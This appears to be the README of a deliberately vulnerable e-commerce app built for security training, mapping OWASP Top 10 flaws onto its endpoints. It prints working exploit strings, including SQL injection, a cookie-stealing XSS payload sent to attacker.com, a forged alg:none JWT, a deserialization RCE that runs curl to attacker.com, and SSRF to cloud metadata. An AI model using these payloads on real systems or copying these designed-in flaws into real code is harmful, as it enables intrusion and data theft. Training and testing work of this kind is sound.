# NexusStore — Intentionally Vulnerable E-Commerce App

> **WARNING**: This application contains intentional security vulnerabilities for demonstration and educational purposes. **Do NOT deploy with real user data.** Do NOT use real credentials, credit cards, or sensitive information.

A deliberately insecure ecommerce application demonstrating all OWASP Top 10 vulnerabilities in a realistic, working storefront. Useful for security scanner testing, pentesting practice, and training.

---

## Quick Start

```bash
# Install dependencies
npm install

# Run locally (set DATABASE_URL in .env first)
npm run dev
# → http://localhost:3000

# Initialize the database (run once after deploy)
GET /api/init

# Reset to seed state before a demo
POST /api/reset?key=resetme123
```

## Demo Accounts

| Username | Password | Role |
|---|---|---|
| admin | admin | Admin |
| alice | password123 | User |
| bob | qwerty | User |
| charlie | letmein | User |

---

## Deploy to Vercel + Neon

1. Create a free PostgreSQL database at [neon.tech](https://neon.tech)
2. `npm i -g vercel && vercel login`
3. `vercel env add DATABASE_URL` — paste Neon connection string
4. `vercel env add RESET_KEY` — pick a secret (default: `resetme123`)
5. `vercel deploy --prod`
6. Visit `https://your-app.vercel.app/api/init` to seed the database

---

## OWASP Top 10 Vulnerability Map

### A01 — Broken Access Control

| Endpoint | Exploit |
|---|---|
| `GET /api/orders/{id}` | IDOR: any authenticated user reads any order |
| `GET /api/users/{id}` | IDOR: view any user's profile, password hash, and credit card |
| `PUT /api/cart/{userId}` | IDOR: modify any user's cart |
| `/admin` | No auth check — accessible to anyone who knows the URL |

**Exploit**: Log in as `alice`, then `GET /api/orders/3` to read bob's order (owned by user 3).

---

### A02 — Cryptographic Failures

- Passwords hashed with **unsalted MD5** (`crypto.createHash('md5')`)
- Credit card numbers stored and returned in **plaintext**
- JWT signed with hardcoded secret `"secret"` — visible in source
- `GET /api/users/{id}` returns the full user row including `password` hash and `credit_card`
- Session cookie has no `HttpOnly` or `Secure` flags

**Exploit**: `GET /api/users/2` returns `{"password":"482c811da5d5b4bc6d497ffa98491e38","credit_card":"4242424242424242",...}`. Crack the MD5 hash at crackstation.net → `password123`.

---

### A03 — Injection

| Vector | Location |
|---|---|
| SQL injection | `GET /api/products?q=` — raw string interpolation |
| SQL injection | `POST /api/auth/login` — username field |
| SQL injection | `GET /api/products/{id}` — path param |
| Stored XSS | `POST /api/reviews` — body stored as-is, rendered via `dangerouslySetInnerHTML` |
| Reflected XSS | Review body rendered on `/products/{id}` without sanitization |

**SQLi exploit**: `GET /api/products?q=' UNION SELECT username,email,password,4,5,6,7 FROM users--`

**XSS exploit**: Submit a review with body `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`. Pre-seeded XSS on product #1.

---

### A04 — Insecure Design

- **Predictable password reset token**: `MD5(email)` — `POST /api/auth/reset` returns it directly
- **No rate limiting** anywhere (login, reset, checkout)
- **Coupon code `SAVE10`** can be applied unlimited times; stacking on a single order gives unlimited discounts
- **Negative cart quantities** accepted — `PUT /api/cart/{userId}` with `{"quantity": -100}` drives totals negative

**Exploit**: `POST /api/auth/reset {"email":"alice@example.com"}` → response includes `"token":"482c811da5d5b4bc6d497ffa98491e38"`. Use token to reset password.

---

### A05 — Security Misconfiguration

| Finding | URL |
|---|---|
| Committed `.env` with secrets | `GET /.env` |
| Exposed `package.json` | `GET /package.json` |
| All environment variables | `GET /api/debug/info` |
| Simulated directory listing | `GET /api/uploads` |
| Swagger UI in production | `GET /docs` |
| OpenAPI spec (unauthenticated) | `GET /api/openapi` |
| `Access-Control-Allow-Origin: *` with credentials | All `/api/*` routes |

---

### A06 — Vulnerable and Outdated Components

Known-vulnerable packages (visible in `GET /package.json`):

| Package | Version | CVE |
|---|---|---|
| `lodash` | 4.17.4 | CVE-2019-10744 (prototype pollution) |
| `node-serialize` | 0.0.4 | CVE-2017-5941 (RCE via deserialization) |

---

### A07 — Identification and Authentication Failures

- No account lockout after failed logins
- No minimum password length (single character accepted)
- **Username enumeration**: different error messages — `"User not found"` vs `"Incorrect password"`
- **JWT algorithm confusion**: `alg: none` accepted
- Session cookie cleared client-side on logout only — server doesn't invalidate tokens

**JWT alg:none exploit**:
```python
import base64, json
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"id":1,"username":"admin","role":"admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."
# Use as Authorization: Bearer <token>
```

---

### A08 — Software and Data Integrity Failures

- **Bootstrap loaded from CDN without `integrity` attribute** (missing SRI on `_document.jsx`)
- **`node-serialize` RCE**: `GET /api/users/{id}` deserializes the `profile` cookie using `node-serialize.unserialize()`

**RCE exploit** (set cookie then call any `/api/users/*` endpoint):
```python
import base64, json
payload = json.dumps({"x": "_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/$(id)')}()"})
cookie = base64.b64encode(payload.encode()).decode()
# Set-Cookie: profile=<cookie>
```

- **Plugin eval**: `POST /api/admin/plugins {"plugin_url":"https://attacker.com/payload.js"}` — fetches and `eval()`s the response

---

### A09 — Security Logging and Monitoring Failures

- `POST /api/auth/login` logs `password=<plaintext>` to stdout
- No logging of failed authentication attempts
- No alerting on repeated 403s or anomalous order values
- No monitoring integration

---

### A10 — Server-Side Request Forgery (SSRF)

| Endpoint | Trigger |
|---|---|
| `POST /api/admin/import-image?url=` | Server fetches arbitrary URL |
| `POST /api/webhooks` | Server fetches webhook URL to "verify" it |
| Order placement | Server triggers all registered webhooks |

**Exploit**: `POST /api/admin/import-image?url=http://169.254.169.254/latest/meta-data/` — reaches AWS instance metadata.

**Internal port scan**: `POST /api/admin/import-image?url=http://localhost:5432` — probe internal services.

---

## Demo Reset

Before each scan or demo:
```
POST https://your-app.vercel.app/api/reset?key=resetme123
```
Restores all tables to seed state in ~1 second.

---

## Architecture

```
Next.js 14 (pages router)
├── pages/api/          ← Serverless API routes (all vulnerable)
├── pages/              ← React frontend
├── lib/db.js           ← PostgreSQL (Neon)
├── lib/auth.js         ← JWT (secret="secret"), MD5 passwords
└── lib/swagger.js      ← OpenAPI spec served at /api/openapi
```

---

## License

MIT — use freely for security education, CTFs, and product demonstrations.
